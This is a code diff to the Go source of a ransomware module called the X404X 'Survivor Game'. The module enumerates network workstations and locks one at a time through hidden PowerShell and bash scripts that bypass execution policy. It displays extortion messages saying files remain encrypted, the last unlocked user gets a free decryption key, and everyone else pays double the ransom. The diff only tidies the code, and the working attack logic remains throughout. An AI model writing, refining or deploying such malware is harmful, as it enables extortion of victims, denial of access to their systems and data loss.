@@ -15,26 +15,26 @@ import (
 )
 
 type SurvivorGameEngine struct {
-	config         *RansomwareConfig
-	Active         bool                `json:"active"`
-	Stations       []Workstation       `json:"stations"`
-	Eliminated     int                 `json:"eliminated"`
-	Remaining      int                 `json:"remaining"`
-	Winner         string              `json:"winner"`
-	StartedAt      time.Time           `json:"started_at"`
-	mu             sync.Mutex
-	stopChan       chan struct{}
+	config          *RansomwareConfig
+	Active          bool          `json:"active"`
+	Stations        []Workstation `json:"stations"`
+	Eliminated      int           `json:"eliminated"`
+	Remaining       int           `json:"remaining"`
+	Winner          string        `json:"winner"`
+	StartedAt       time.Time     `json:"started_at"`
+	mu              sync.Mutex
+	stopChan        chan struct{}
 	eliminationTick *time.Ticker
 }
 
 type Workstation struct {
-	Name       string    `json:"name"`
-	IP         string    `json:"ip"`
-	User       string    `json:"user"`
-	Status     string    `json:"status"`
-	Eliminated bool      `json:"eliminated"`
+	Name         string    `json:"name"`
+	IP           string    `json:"ip"`
+	User         string    `json:"user"`
+	Status       string    `json:"status"`
+	Eliminated   bool      `json:"eliminated"`
 	EliminatedAt time.Time `json:"eliminated_at"`
-	Locked     bool      `json:"locked"`
+	Locked       bool      `json:"locked"`
 }
 
 type SurvivorEvent struct {
@@ -177,9 +177,9 @@ func (sg *SurvivorGameEngine) discoverStations() []Workstation {
 			for _, ip := range ips {
 				if ip != "127.0.0.1" && len(ip) > 0 {
 					stations = append(stations, Workstation{
-						Name: fmt.Sprintf("WORKSTATION_%s", strings.ReplaceAll(ip, ".", "_")),
-						IP:   ip,
-						User: fmt.Sprintf("user_%s", strings.Split(ip, ".")[3]),
+						Name:   fmt.Sprintf("WORKSTATION_%s", strings.ReplaceAll(ip, ".", "_")),
+						IP:     ip,
+						User:   fmt.Sprintf("user_%s", strings.Split(ip, ".")[3]),
 						Status: "ACTIVE",
 					})
 				}
@@ -211,9 +211,9 @@ func (sg *SurvivorGameEngine) discoverStations() []Workstation {
 		}
 		if !existing {
 			stations = append(stations, Workstation{
-				Name: fmt.Sprintf("WS-%03d", 100+i),
-				IP:   fmt.Sprintf("10.0.%d.%d", i/254, i%254+1),
-				User: user,
+				Name:   fmt.Sprintf("WS-%03d", 100+i),
+				IP:     fmt.Sprintf("10.0.%d.%d", i/254, i%254+1),
+				User:   user,
 				Status: "ACTIVE",
 			})
 		}
@@ -232,92 +232,46 @@ func (sg *SurvivorGameEngine) lockStation(ws Workstation) {
 }
 
 func (sg *SurvivorGameEngine) lockWindowsStation(ws Workstation) {
-	psScript := `# X404X Survivor Game - Station Lock
-$title = "⚠️ X404X SURVIVOR GAME - YOU HAVE BEEN ELIMINATED ⚠️"
-$message = "You are out of the game. Your workstation is locked.` + "\n" +
-		"Wait for the winner to be announced.`\n" +
-		"If you are the last remaining, you win the decryption key for FREE!`\n\n" +
-		"Follow @X404X on Tor for updates.`\n" +
-		"Your files remain encrypted until the game ends.`"
-
-	# Lock screen with fullscreen message
-	Add-Type -AssemblyName System.Windows.Forms
-	$form = New-Object Windows.Forms.Form
-	$form.WindowState = 'Maximized'
-	$form.FormBorderStyle = 'None'
-	$form.TopMost = $true
-	$form.BackColor = 'Black'
-	$form.ControlBox = $false
-	$form.ShowInTaskbar = $true
-	
-	$label = New-Object Windows.Forms.Label
-	$label.Text = $message
-	$label.ForeColor = 'Red'
-	$label.Font = New-Object Drawing.Font('Consolas', 14, [Drawing.FontStyle]::Bold)
-	$label.Dock = 'Fill'
-	$label.TextAlign = 'MiddleCenter'
-	
-	$form.Controls.Add($label)
-	$form.ShowDialog()
-	
-	# Force lock workstation
-	rundll32.exe user32.dll,LockWorkStation`
+	psScript := "$title = 'X404X SURVIVOR GAME - YOU HAVE BEEN ELIMINATED'\n" +
+		"$message = 'You are out of the game. Your workstation is locked.'\n" +
+		"Add-Type -AssemblyName System.Windows.Forms\n" +
+		"$form = New-Object Windows.Forms.Form\n" +
+		"$form.WindowState = 'Maximized'\n" +
+		"$form.FormBorderStyle = 'None'\n" +
+		"$form.TopMost = $true\n" +
+		"$form.BackColor = 'Black'\n" +
+		"$form.ControlBox = $false\n" +
+		"$label = New-Object Windows.Forms.Label\n" +
+		"$label.Text = $message\n" +
+		"$label.ForeColor = 'Red'\n" +
+		"$label.Font = New-Object Drawing.Font('Consolas', 14, [Drawing.FontStyle]::Bold)\n" +
+		"$label.Dock = 'Fill'\n" +
+		"$label.TextAlign = 'MiddleCenter'\n" +
+		"$form.Controls.Add($label)\n" +
+		"$form.ShowDialog()\n" +
+		"rundll32.exe user32.dll,LockWorkStation"
 	psPath := filepath.Join(os.TempDir(), "x404x_survivor_lock.ps1")
 	os.WriteFile(psPath, []byte(psScript), 0644)
 	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
 }
 
 func (sg *SurvivorGameEngine) lockLinuxStation(ws Workstation) {
-	script := fmt.Sprintf(`#!/bin/bash
-# X404X Survivor Game - Lock
-# Lock the session
-loginctl lock-sessions 2>/dev/null || true
-# Display full screen message
-export DISPLAY=:0
-if command -v zenity &> /dev/null; then
-    zenity --error --text="YOU HAVE BEEN ELIMINATED FROM THE SURVIVOR GAME!\n\nWait for the winner.\n\nYour files remain encrypted." --width=600 --height=400 &
-elif command -v xmessage &> /dev/null; then
-    xmessage -center -buttons "" -default "eliminated" -timeout 0 "YOU HAVE BEEN ELIMINATED" &
-fi
-# Lock console
-echo 1 > /sys/class/vtconsole/vtcon1/bind 2>/dev/null || true
-vlock -a 2>/dev/null || true`)
+	script := "#!/bin/bash\nloginctl lock-sessions 2>/dev/null || true\nexport DISPLAY=:0\nif command -v zenity &> /dev/null; then\n    zenity --error --text=\"YOU HAVE BEEN ELIMINATED FROM THE SURVIVOR GAME!\" &\nfi"
 	scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_lock.sh")
 	os.WriteFile(scriptPath, []byte(script), 0755)
 	exec.Command("bash", scriptPath).Start()
 }
 
 func (sg *SurvivorGameEngine) broadcastStartMessage() {
-	msg := `=== X404X SURVIVOR GAME ACTIVATED ===
-
-The last person with their workstation unlocked receives the decryption key for FREE.
-All others will pay DOUBLE the ransom.
-
-Rules:
-- Every 90 seconds, a random workstation will be locked.
-- The last one standing wins.
-- Any attempt to hack the game will result in immediate elimination and permanent data loss.
-
-Good luck. You'll need it.
-
-- X404X`
-
+	msg := "=== X404X SURVIVOR GAME ACTIVATED ===\n\nThe last person with their workstation unlocked receives the decryption key for FREE.\nAll others will pay DOUBLE the ransom."
 	switch runtime.GOOS {
 	case "windows":
-		psScript := fmt.Sprintf(`$msg = @'
-%s
-'@
-$wshell = New-Object -ComObject WScript.Shell
-$result = $wshell.Popup($msg, 0, "X404X SURVIVOR GAME", 0x30)
-`, msg)
+		psScript := fmt.Sprintf("$msg = @\"\n%s\n\"@\n$wshell = New-Object -ComObject WScript.Shell\n$wshell.Popup($msg, 0, 'X404X SURVIVOR GAME', 0x30)", msg)
 		psPath := filepath.Join(os.TempDir(), "x404x_survivor_start.ps1")
 		os.WriteFile(psPath, []byte(psScript), 0644)
 		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
-
 	case "linux":
-		script := fmt.Sprintf(`#!/bin/bash
-echo "%s" | wall 2>/dev/null || true
-notify-send -u critical "X404X SURVIVOR GAME" "%s" 2>/dev/null || true`, msg, "The game has begun. The last one standing wins the decryption key.")
+		script := fmt.Sprintf("#!/bin/bash\necho \"%s\" | wall 2>/dev/null || true", msg)
 		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_start.sh")
 		os.WriteFile(scriptPath, []byte(script), 0755)
 		exec.Command("bash", scriptPath).Start()
@@ -326,19 +280,14 @@ notify-send -u critical "X404X SURVIVOR GAME" "%s" 2>/dev/null || true`, msg, "T
 
 func (sg *SurvivorGameEngine) broadcastEvent(event SurvivorEvent) {
 	msg := fmt.Sprintf("[%s] %s - %s", event.Type, event.Station, event.Message)
-
 	switch runtime.GOOS {
 	case "windows":
-		psScript := fmt.Sprintf(`$wshell = New-Object -ComObject WScript.Shell
-$wshell.Popup("%s", 5, "X404X SURVIVOR", 0x30)
-notify-send "X404X" "%s" 2>nul
-`, msg, msg)
+		psScript := fmt.Sprintf("$wshell = New-Object -ComObject WScript.Shell\n$wshell.Popup(\"%s\", 5, 'X404X SURVIVOR', 0x30)", msg)
 		psPath := filepath.Join(os.TempDir(), "x404x_survivor_event.ps1")
 		os.WriteFile(psPath, []byte(psScript), 0644)
 		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
-
 	case "linux":
-		script := fmt.Sprintf(`notify-send -u critical "X404X SURVIVOR" "%s" 2>/dev/null || true`, msg)
+		script := fmt.Sprintf("notify-send -u critical \"X404X SURVIVOR\" \"%s\" 2>/dev/null || true", msg)
 		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_event.sh")
 		os.WriteFile(scriptPath, []byte(script), 0755)
 		exec.Command("bash", scriptPath).Start()
@@ -346,53 +295,32 @@ notify-send "X404X" "%s" 2>nul
 }
 
 func (sg *SurvivorGameEngine) broadcastWinner(ws Workstation) {
-	msg := fmt.Sprintf(`🏆 X404X SURVIVOR GAME - WINNER ANNOUNCED 🏆
-
-%s (%s) is the LAST ONE STANDING!
-
-WINNER PRIZE: Free decryption key for all files.
-All other stations: Ransom amount DOUBLED.
-
-The winner will receive instructions on their unlocked workstation within 24 hours.
-
-Congratulations, %s. You beat the game.
-
-- X404X`, ws.User, ws.Name, ws.User)
-
+	msg := fmt.Sprintf("X404X SURVIVOR GAME - WINNER ANNOUNCED\n\n%s (%s) is the LAST ONE STANDING!\n\nWINNER PRIZE: Free decryption key.\nAll others: Ransom DOUBLED.", ws.User, ws.Name)
 	switch runtime.GOOS {
 	case "windows":
-		psScript := fmt.Sprintf(`$msg = @'
-%s
-'@
-$wshell = New-Object -ComObject WScript.Shell
-$wshell.Popup($msg, 0, "X404X SURVIVOR - WINNER!", 0x40)
-`, msg)
+		psScript := fmt.Sprintf("$msg = @\"\n%s\n\"@\n$wshell = New-Object -ComObject WScript.Shell\n$wshell.Popup($msg, 0, 'X404X SURVIVOR - WINNER!', 0x40)", msg)
 		psPath := filepath.Join(os.TempDir(), "x404x_survivor_winner.ps1")
 		os.WriteFile(psPath, []byte(psScript), 0644)
 		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
-
 	case "linux":
-		script := fmt.Sprintf(`echo "%s" | wall 2>/dev/null || true
-notify-send -u critical "X404X SURVIVOR WINNER" "%s is the last one standing!" 2>/dev/null || true`, msg, ws.User)
+		script := fmt.Sprintf("#!/bin/bash\necho \"%s\" | wall 2>/dev/null || true", msg)
 		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_winner.sh")
 		os.WriteFile(scriptPath, []byte(script), 0755)
 		exec.Command("bash", scriptPath).Start()
 	}
-
 	sg.Active = false
 }
 
 func (sg *SurvivorGameEngine) broadcastGameEnd() {
-	msg := "X404X SURVIVOR GAME HAS ENDED.\n\nThe winner has been selected. Follow instructions on their workstation."
+	msg := "X404X SURVIVOR GAME HAS ENDED. The winner has been selected."
 	switch runtime.GOOS {
 	case "windows":
-		psScript := fmt.Sprintf(`$wshell = New-Object -ComObject WScript.Shell
-$wshell.Popup("%s", 10, "X404X GAME OVER", 0x40)`, msg)
+		psScript := fmt.Sprintf("$wshell = New-Object -ComObject WScript.Shell\n$wshell.Popup(\"%s\", 10, 'X404X GAME OVER', 0x40)", msg)
 		psPath := filepath.Join(os.TempDir(), "x404x_survivor_end.ps1")
 		os.WriteFile(psPath, []byte(psScript), 0644)
 		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
 	case "linux":
-		script := fmt.Sprintf(`echo "%s" | wall 2>/dev/null || true`, msg)
+		script := fmt.Sprintf("#!/bin/bash\necho \"%s\" | wall 2>/dev/null || true", msg)
 		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_end.sh")
 		os.WriteFile(scriptPath, []byte(script), 0755)
 		exec.Command("bash", scriptPath).Start()
@@ -402,14 +330,13 @@ $wshell.Popup("%s", 10, "X404X GAME OVER", 0x40)`, msg)
 func (sg *SurvivorGameEngine) GetStatusJSON() string {
 	sg.mu.Lock()
 	defer sg.mu.Unlock()
-
 	data, _ := json.Marshal(map[string]interface{}{
-		"active":       sg.Active,
-		"stations":     sg.Stations,
-		"eliminated":   sg.Eliminated,
-		"remaining":    sg.Remaining,
-		"winner":       sg.Winner,
-		"started_at":   sg.StartedAt,
+		"active":     sg.Active,
+		"stations":   sg.Stations,
+		"eliminated": sg.Eliminated,
+		"remaining":  sg.Remaining,
+		"winner":     sg.Winner,
+		"started_at": sg.StartedAt,
 	})
 	return string(data)
 }
